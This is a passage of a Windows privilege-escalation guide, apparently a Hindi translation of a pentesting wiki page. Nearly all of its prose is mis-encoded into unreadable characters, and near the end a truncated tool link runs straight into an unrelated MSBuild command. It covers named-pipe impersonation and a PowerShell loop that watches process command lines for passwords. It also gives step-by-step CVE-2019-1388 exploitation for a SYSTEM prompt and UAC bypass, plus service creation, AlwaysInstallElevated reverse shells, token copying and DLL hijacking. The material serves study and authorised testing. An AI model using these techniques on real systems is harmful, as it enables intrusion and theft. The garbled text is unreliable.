`рдиреЗрдореНрдб рдкрд╛рдЗрдкреНрд╕` рдПрдХ Windows рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рд╣реИ рдЬреЛ рджреЛ рдЕрд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдПрдХ рджреВрд╕рд░реЗ рдХреЗ рдмреАрдЪ рдбреЗрдЯрд╛ рд╡рд┐рдирд┐рдордп рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдпрджреНрдпрдкрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдБ рджреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рдкрд░ рд╕реНрдерд┐рдд рд╣реЛрдВред рдпрд╣ рдХреНрд▓рд╛рдЗрдВрдЯ/рд╕рд░реНрд╡рд░ рдЖрд░реНрдХрд┐рдЯреЗрдХреНрдЪрд░ рдХреЗ рдмрд╣реБрдд рд╕рдорд╛рди рд╣реИ рдХреНрдпреЛрдВрдХрд┐ `рдиреЗрдореНрдб рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░` рдФрд░ `рдиреЗрдореНрдб рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ` рдЬреИрд╕реЗ рдзрд╛рд░рдгрд╛рдПрдБ рдореМрдЬреВрдж рд╣реЛрддреА рд╣реИрдВред

рдЬрдм рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд╛рдЗрдк рдкрд░ рд▓рд┐рдЦрддрд╛ рд╣реИ**, рддреЛ рдкрд╛рдЗрдк рдХреЛ рдмрдирд╛рдиреЗ рд╡рд╛рд▓рд╛ **рд╕рд░реНрд╡рд░** рдЙрд╕ **рдХреНрд▓рд╛рдЗрдВрдЯ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЕрдЧрд░ рдЙрд╕рдХреЗ рдкрд╛рд╕ **SeImpersonate** рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВред рдлрд┐рд░, рдпрджрд┐ рдЖрдк **рдПрдХ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░рд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдвреВрдВрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдЕрдиреБрдХрд░рдг рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рдкрд╛рдЗрдк рдкрд░ рд▓рд┐рдЦреЗрдЧреА**, рддреЛ рдЖрдк рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред [**рдЗрд╕реЗ рдХреИрд╕реЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдкрдврд╝реЗрдВ**](named-pipe-client-impersonation.md) **рдпрд╛** [**рдпрд╣**](./#from-high-integrity-to-system)**ред**

**рдЗрд╕ рдЯреВрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдиреЗрдореНрдб рдкрд╛рдЗрдк рд╕рдВрдЪрд╛рд░ рдХреЛ burp рдЬреИрд╕реЗ рдЯреВрд▓ рдХреЗ рд╕рд╛рде рдЕрд╡рд░реЛрдзрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **рдФрд░ рдпрд╣ рдЯреВрд▓ рдкреНрд░рд╛рдЗрд╡реЗрд╕реНрдХреНрд╕ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рд╕рднреА рдкрд╛рдЗрдкреНрд╕ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдФрд░ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)****

## рд╡рд┐рд╡рд┐рдз

### **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХреА рдирд┐рдЧрд░рд╛рдиреА**

рдЬрдм рдЖрдк рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╢реИрд▓ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рд╕рдордп рдХреЗ рдмрд╛рдж рдЪрд▓ рд░рд╣реА рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп рдпрд╛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдкрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкрд╛рд╕ рдХрд░рддреА рд╣реИрдВ**ред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдореЗрдВ рд╣рд░ рджреЛ рд╕реЗрдХрдВрдб рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╡рд░реНрддрдорд╛рди рд╕реНрдерд┐рддрд┐ рдХреЛ рдкрд┐рдЫрд▓реА рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рдЕрдВрддрд░ рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИред
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## рдирд┐рдореНрди рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass рддрдХ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдЗрдВрдЯрд░рдлрд╝реЗрд╕ (рдХрдВрд╕реЛрд▓ рдпрд╛ RDP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдФрд░ UAC рд╕рдХреНрд╖рдо рд╣реИ, рддреЛ рдХреБрдЫ Microsoft Windows рдХреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдПрдХ рдЕрдиреБрдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬреНрдб рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЯрд░реНрдорд┐рдирд▓ рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬреИрд╕реЗ "NT\AUTHORITY SYSTEM" рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИред

рдЗрд╕рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдЙрдЪреНрдЪрд╛рдзрд┐рдХрд╛рд░ рдФрд░ UAC рдХреЛ рдПрдХ рд╕рд╛рде рдЙрдиреНрдирдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдЗрд╕реА рд╕рдВрдХреНрд░рдордг рдХреЗ рд╕рд╛рде UAC рдХреЛ рдЫреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдХреБрдЫ рднреА рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмрд╛рдЗрдирд░реА, Microsoft рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдФрд░ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдХреБрдЫ рдкреНрд░рднрд╛рд╡рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдорд┐рд▓ рд╣реИрдВ:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХреЛ рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

```
1) HHUPD.EXE рдлрд╝рд╛рдЗрд▓ рдкрд░ рджрд╛рдпрд╛рдВ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдВред

2) UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдЖрдиреЗ рдкрд░, "рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рджрд┐рдЦрд╛рдПрдВ" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

3) "рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рд░реА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ" URL рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИред

4) рд╕рд╛рдЗрдЯ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ рдФрд░ "Save as" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ explorer.exe рд╡рд┐рдВрдбреЛ рдЖрдПред

5) рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд╡рд┐рдВрдбреЛ рдХреЗ рдкрддреЗ рдорд╛рд░реНрдЧ рдореЗрдВ, cmd.exe, powershell.exe рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджрд░реНрдЬ рдХрд░реЗрдВред

6) рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ "NT\AUTHORITY SYSTEM" рдХрдорд╛рдВрдб рдкреНрд░реЙрдореНрдкреНрдЯ рд╣реЛрдЧрд╛ред

7) рдЕрдкрдиреЗ рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рд╡рд╛рдкрд╕ рдЖрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯрдЕрдк рдФрд░ UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд░рджреНрдж рдХрд░рдирд╛ рди рднреВрд▓реЗрдВред
```

рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ GitHub рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рд╣реИрдВ:

https://github.com/jas502n/CVE-2019-1388

## рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ / UAC рдмрд╛рдИрдкрд╛рд╕

**рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

рдлрд┐рд░ **UAC рдФрд░ UAC рдмрд╛рдИрдкрд╛рд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ**

### **рдирдИ рд╕реЗрд╡рд╛**

рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдЪреНрдЪ рдЕрдЦрдВрдбрддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ, рддреЛ **рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪ** рдЖрд╕рд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдмрд╕ **рдПрдХ рдирдИ рд╕реЗрд╡рд╛ рдмрдирд╛рдПрдВ рдФрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

рдПрдХ рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЖрдкрдХреЛ **AlwaysInstallElevated рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐рдпреЛрдВ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ** рдФрд░ рдПрдХ _**.msi**_ рд░реИрдкрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреНрд░рддрд┐рд╡рд░реНрддреА рд╢реИрд▓ рдХреЛ **рд╕реНрдерд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреАрдпреЛрдВ рдФрд░ рдПрдХ _.msi_ рдкреИрдХреЗрдЬ рдХреЛ рдХреИрд╕реЗ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдВ рдпрд╣рд╛рдВ рджреЗрдЦреЗрдВред](./#alwaysinstallelevated)

### High + SeImpersonate рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ

**рдЖрдк** [**рдпрд╣рд╛рдВ рдХреЛрдб рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](seimpersonate-from-high-to-system.md)**ред**

### SeDebug + SeImpersonate рд╕реЗ рдкреВрд░реНрдг рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рддрдХ

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╡реЗ рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реИрдВ (рд╕рдВрднрд╡рддрдГ рдЖрдкрдХреЛ рдЗрд╕реЗ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдорд┐рд▓реЗрдЧрд╛), рддреЛ рдЖрдк **рд▓рдЧрднрдЧ рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЦреЛрд▓ рд╕рдХреЗрдВрдЧреЗ** (рд╕рдВрд░рдХреНрд╖рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдирд╣реАрдВ) SeDebug рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд╛рде, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **рдЯреЛрдХрди рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐** рдмрдирд╛рдПрдВ, рдФрд░ рдЙрд╕ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде **рдПрдХ рдЕрдирд┐рдпрдорд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдПрдВ**ред\
рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдЖрдорддреМрд░ рдкрд░ **рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рдХрд┐рд╕реА рднреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕рднреА рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ** (_рд╣рд╛рдБ, рдЖрдк рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕рд┐рд╕реНрдЯрдо рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рдирдореЗрдВ рд╕рднреА рдЯреЛрдХрди рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ_)ред\
**рдЖрдк рдпрд╣рд╛рдВ рдПрдХ** [**рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рддрдХрдиреАрдХ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛрдб рдХрд╛ рдЙрджрд╛рд╣рд░рдг рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ**](sedebug-+-seimpersonate-copy-token.md)**ред**

### **рдирд╛рдорд┐рдд рдкрд╛рдЗрдкреНрд╕**

рдпрд╣ рддрдХрдиреАрдХ рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рджреНрд╡рд╛рд░рд╛ `getsystem` рдореЗрдВ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИред рддрдХрдиреАрдХ рдХрд╛ рд╕рд┐рджреНрдзрд╛рдВрдд рд╣реИ **рдПрдХ рдкрд╛рдЗрдк рдмрдирд╛рдирд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕ рдкрд╛рдЗрдк рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╕реЗрд╡рд╛ рдмрдирд╛рдирд╛/рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛**ред рдлрд┐рд░, рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ (рд╕реЗрд╡рд╛) рдХреЗ рдЯреЛрдХрди рдХреА **рдЕрдиреБрдХрд░рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкрд╛рдЗрдк рдХреЛ рдмрдирд╛рдиреЗ рд╡рд╛рд▓рд╛ **рд╕рд░реНрд╡рд░** (рдЬреЛ **`SeImpersonate`** рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ) рд╕рд┐рд╕реНрдЯрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ред\
рдпрджрд┐ рдЖрдк [**рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЕрдзрд┐рдХ рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдпрд╣рд╛рдВ рдкрдврд╝реЗрдВ**](./#named-pipe-client-impersonation)ред\
рдпрджрд┐ рдЖрдк [**рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреИрд╕реЗ рдХрд░реЗрдВ рдЗрд╕рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдпрд╣рд╛рдВ рдкрдврд╝реЗрдВ**](from-high-integrity-to-system-with-name-pipes.md)ред

### Dll Hijacking

рдпрджрд┐ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо** рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА **рдкреНрд░рдХреНрд░рд┐рдпрд╛** рджреНрд╡рд╛рд░рд╛ **рд▓реЛрдб** рд╣реЛ рд░рд╣реА **рдПрдХ dll рдХреЛ рд╣рд╛рдЗрдЬреИрдХ** рдХрд░рдиреЗ рдореЗрдВ рд╕рдлрд▓ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╡рд┐рдЪрд╛рд░рд╣реАрди рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХреЗрдВрдЧреЗред рдЗрд╕рд▓рд┐рдП Dll Hijacking рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рдХреЗ рд▓рд┐рдП рднреА рдЙрдкрдпреЛрдЧреА рд╣реИ, рдФрд░ рдЗрд╕рд╕реЗ рдЕрдзрд┐рдХ рдорд╛рддреНрд░рд╛ рдореЗрдВ рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЖрд╕рд╛рди рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдХреЗ рдкрд╛рд╕ dlls рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдкрд░ **рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрддреА рд╣реИрдВред\
**рдЖрдк рдпрд╣рд╛рдВ Dll рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ** [**рдпрд╣рд╛рдВ рдкрдврд╝реЗрдВ**](dll-hijacking.md)**ред**

### **рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдпрд╛ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE рдпрд╛ NETWORK SERVICE рд╕реЗ рдкреВрд░реНрдг рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рддрдХ

**рдкрдврд╝реЗрдВ:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## рдЕрдзрд┐рдХ рдорджрдж

[рд╕реНрдерд┐рд░ impacket рдмрд╛рдЗрдирд░реА](https://github.com/ropnop/impacket\_static\_binaries)

## рдЙрдкрдпреЛрдЧреА рдЙрдкрдХрд░рдг

**Windows рд╕реНрдерд╛рдиреАрдп рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐ рд╡реЗрдХреНрдЯрд░реНрд╕ рдХреЗ рд▓рд┐рдП рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда рдЙрдкрдХрд░рдг:** [**WinPEAS**](https://github.com/carlospolop/
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## рд╕рдВрджрд░реНрдн

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
[http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
[https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
[https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
[https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
[https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
[https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
[http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
